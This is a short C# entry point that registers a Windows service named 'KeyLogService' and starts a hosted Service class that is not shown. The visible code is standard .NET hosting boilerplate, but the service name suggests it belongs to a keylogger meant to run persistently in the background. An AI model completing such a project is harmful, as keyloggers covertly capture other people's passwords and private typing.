using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using System.Diagnostics;
using System.Collections;
using System.Configuration.Install;
using System.ComponentModel;
using System.Runtime.InteropServices;
using Microsoft.Win32;


class Program{
    static public void Main(string[] args){
        var host = new HostBuilder().ConfigureServices(service =>{
            service.AddWindowsService(serv=>{
                serv.ServiceName = "KeyLogService";
            });
            service.AddHostedService<Service>();
        }).Build();
        host.Run();
    }
}
